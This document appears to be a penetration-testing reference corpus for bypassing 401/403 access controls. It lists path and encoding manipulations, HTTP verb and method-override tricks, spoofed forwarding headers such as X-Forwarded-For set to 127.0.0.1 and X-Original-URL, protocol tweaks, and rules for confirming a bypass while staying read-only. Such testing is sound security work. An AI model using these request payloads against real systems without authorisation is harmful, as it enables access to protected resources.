# Forbidden / 403 bypass — technique corpus

Goal: a resource that returns **401/403** on a plain request is reached anyway because the control is
enforced at the wrong layer (edge proxy / WAF / load balancer / app router) and a crafted request slips
past it. Always compare against a **baseline** (the plain denied request) and a **success oracle** (what the
granted resource actually looks like) — a bare `200` is not proof; the real restricted body is.

Send the **raw** request (no client-side path normalization). One axis at a time, then combine survivors.
`FUZZ` = the restricted path (e.g. `/admin`). Keep everything read-only and benign.

---

## 1. Path / URL manipulation

The proxy and the backend disagree on what the path *is*. Make the proxy see an allowed path and the
backend resolve the restricted one (or vice-versa).

Trailing / leading tweaks:
```
/FUZZ        (baseline)
/FUZZ/
//FUZZ//
/FUZZ/.
/FUZZ/./
/./FUZZ/./
/FUZZ%20
/FUZZ%09
/FUZZ?
/FUZZ??
/FUZZ#
/FUZZ/~
/FUZZ.json  /FUZZ.html  /FUZZ.php  (and other extensions the app serves)
```

Dot-segment / path-parameter / semicolon tricks (proxy-vs-backend parser gap):
```
/FUZZ/..;/
/FUZZ/..;/FUZZ
/FUZZ;/
/FUZZ/;/
/.;/FUZZ
/FUZZ/.;/
/%2e/FUZZ
/FUZZ/%2e
```

Encoding (single, double, mixed, overlong) of `/`, `.`, and path chars:
```
/%2fFUZZ           ( %2f = / )
/FUZZ%2f
/%2e%2e/FUZZ       ( %2e%2e = .. )
/%252e%252e/FUZZ   ( double-encoded .. )
/..%2fFUZZ
/FUZZ..%00
/FUZZ%0d  /FUZZ%0a  /FUZZ%00
```

Case + wildcard (case-sensitive allow-rule, lenient backend):
```
/ADMIN  /Admin  /aDmin
/FUZZ/*
/%6admin           ( case/encoding mix )
```

Prefix the app root / known-public prefix the proxy allows:
```
/./FUZZ
/public/../FUZZ
/allowed/..%2fFUZZ
```

---

## 2. HTTP method / verb

The ACL covers `GET` but not other verbs, or the app treats an unknown verb as `GET`.
```
POST /FUZZ      HEAD /FUZZ      OPTIONS /FUZZ
PUT /FUZZ       DELETE /FUZZ    PATCH /FUZZ
TRACE /FUZZ     CONNECT /FUZZ
<RANDOMVERB> /FUZZ      (many stacks fall through to GET)
```

Method-override headers (app routes on the override, proxy ACL sees the real verb):
```
X-HTTP-Method-Override: GET
X-HTTP-Method: GET
X-Method-Override: GET
```

---

## 3. Headers — trust / forwarding / rewrite

The control trusts a header that the client can set. Values are **benign/loopback** (never spoof a real
third party's address for anything but a read-only reachability check).

Source-IP trust (edge allows internal/localhost):
```
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 192.168.0.1
X-Forwarded: 127.0.0.1
Forwarded: for=127.0.0.1
X-Real-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Host: 127.0.0.1
True-Client-IP: 127.0.0.1
Cluster-Client-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
```

URL rewrite / original-URL (front door sees `/`, backend serves the restricted path):
```
GET / HTTP/1.1
X-Original-URL: /FUZZ

GET / HTTP/1.1
X-Rewrite-URL: /FUZZ
```
(also try `X-Override-URL`, `X-Forwarded-Path`.)

Host / referer / origin trust:
```
X-Forwarded-Host: <target>
Referer: https://<target>/FUZZ
Referer: https://<target>/
```

---

## 4. Protocol / version

```
Force HTTP/1.0 (drops Host-based routing rules on some stacks)
Downgrade/upgrade HTTP version; try with and without a Host header
Trailing dot on the Host:   Host: <target>.
```

---

## 5. Combine

Once a single axis shifts behaviour, stack it with others: e.g. `GET /FUZZ/..;/` **+** `X-Forwarded-For:
127.0.0.1`, or `X-Original-URL: /FUZZ` **+** an alternate method. Re-baseline after each win (remove the
axis → must return to 401/403) so the PoC proves *that* manipulation is the cause.

---

## Confirmation rules (what counts as a bypass)

- Baseline denies (401/403 with a deny body) **and** the manipulated request returns the resource's **real
  content** (oracle/body-signature match) — not a bare `200`, soft-404, login redirect, or placeholder.
- Removing the manipulation restores the deny (causality).
- Live, not a cache artifact; the granted body is the restricted resource, not a different public one.
- De-dupe: never-restricted `200` → `exposed-surface`; defeated a login/session/2FA → `auth-bypass`.
- Read-only: prove reachability; do not dump/exfiltrate the protected data.
